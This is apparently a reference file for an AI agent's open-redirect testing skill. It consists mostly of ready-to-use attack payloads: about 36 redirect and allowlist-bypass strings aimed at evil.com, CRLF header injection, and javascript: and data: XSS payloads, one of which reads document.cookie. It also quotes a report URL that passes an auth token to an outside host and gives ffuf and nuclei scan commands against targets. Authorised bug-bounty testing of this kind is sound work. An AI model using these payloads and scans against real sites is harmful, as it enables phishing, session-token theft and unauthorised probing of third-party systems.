# Open Redirect — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- `//evil.com` `https://target.com@evil.com` `https://target.com.evil.com`

- `https://target.com\@evil.com` `//evil.com/%2e%2e` `////evil.com`

- `javascript:alert(1)` `data:text/html,...` when the redirect is client-side

- `https://target.com/redirect?url=https://evil.com` chained



## Payload bank



**36 curated payloads** in 3 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.



### Basic



```text

//evil.com

///evil.com

////evil.com

https://evil.com

http://evil.com

//evil.com/%2e%2e

//evil.com/path

https:evil.com

http:evil.com

\evil.com

```



### Allowlist & parser bypass



```text

https://target.com@evil.com

https://target.com.evil.com

https://target.com\@evil.com

https://target.com%2f@evil.com

https://target.com%00.evil.com

https://target.com%20.evil.com

https://target.com#@evil.com

https://target.com?@evil.com

https://evil.com#target.com

https://evil.com?target.com

https://target.com/redirect?url=https://evil.com

//target.com.evil.com

//target.com@evil.com

//target.com%2f@evil.com

```



### Encoding & scheme tricks



```text

javascript:alert(1)

data:text/html,<script>alert(1)</script>

//evil.com/%0d%0aLocation:%20https://evil.com

https://evil.com%2f..%2ftarget.com

https://evil.com/%2e%2e/target.com

%2f%2fevil.com

%252f%252fevil.com

https:%2f%2fevil.com

//evil.com\@target.com

//evil.com%5c@target.com

//evil.com	.target.com

//evil.com%09.target.com

```



Copyable lists:

- `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect.txt` (36)

- `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect_waf.txt` (26 filter/WAF-focused)



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `wp_redirect()` |

| 3× | `$count = 1` |

| 3× | `<script> / window.opener.location = 'https://davidebove.com/blog/2016/05/05/target_blank-vulnerability-test-page/'; / </script>` |

| 2× | `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map` |

| 2× | `str_replace( OPENVERSE_SUBPATH, '', $path, $count )` |

| 2× | `str_replace()` |

| 2× | `wp_safe_redirect()` |

| 2× | `get_target_url()` |

| 2× | `wp_sanitize_redirect()` |

| 2× | `wp_validate_redirect()` |

| 2× | `@` |

| 1× | `GET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1 / Host: xfarr-6fmjyrz2lq-uc-a-run.app` |

| 1× | `https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F` |

| 1× | `KA_DOMAIN_REGEX.test()` |

| 1× | `isKhanAcademyUrl()` |

| 1× | `maybeAddAuthTransfer()` |

| 1× | `https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/` |

| 1× | `https://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/` |

| 1× | `/..//google.com` |

| 1× | `/../` |



## Parameters observed



`url` · `next` · `redirect_uri` · `client_id` · `email` · `scope` · `response_type` · `return_to` · `return_url` · `redirect` · `feed-stats-url` · `state` · `redir` · `continue` · `redirect_url` · `remember_me` · `query` · `signature` · `page` · `redirect_to`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_open-redirect.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_open-redirect.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect.txt` | 36 |

| `~/.local/share/hackerone-reports/wordlists/payloads_open-redirect_waf.txt` | 26 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_open-redirect.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_open-redirect.txt \

     -mr 'canary|error|invalid|not found' -rate 40

ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_open-redirect.txt \

     -mr '<hit-marker>' -rate 20

```



## Nuclei



Feed redirect params from the wordlist; verify the final Location is off-domain.



```sh

nuclei -u https://target -tags redirect,open-redirect \

       -severity low,medium,high,critical -rl 40 -o nuclei_open-redirect.txt

nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/redirect -dast \

       -rl 40 -o nuclei_open-redirect_redirect.txt

nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \

       -rl 40 -o nuclei_open-redirect_generic.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
